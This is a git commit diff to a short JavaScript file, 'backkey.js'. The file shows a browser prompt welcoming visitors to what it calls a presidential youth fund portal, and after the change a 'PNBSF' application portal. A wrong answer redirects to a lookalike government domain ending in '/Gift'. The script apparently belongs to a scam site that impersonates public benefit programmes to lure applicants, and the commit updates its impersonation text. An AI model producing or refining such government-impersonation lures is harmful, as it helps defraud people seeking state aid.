d3025cd10106f779293b184d141cfb3844b12f10
lagalfredben <lagalfredben@gmail.com>
2026-06-03 14:11:17 +0100

    Update backkey.js

--- backkey.js
+++ backkey.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'Appliquer'
-password=prompt('SMS: BIENVENUE SUR LE PORTAIL DE DEMANDE DU FONDS PRÉSIDENTIEL POUR LAUTONOMISATION DES JEUNES ','Appliquer');
+password=prompt('SMS: BIENVENUE SUR LE PORTAIL DE CANDIDATURE DE LA PNBSF ','Appliquer');
 if (password != 'Appliquer') {
 location.href='https://jeunesse.govserves.site/Gift';
 }
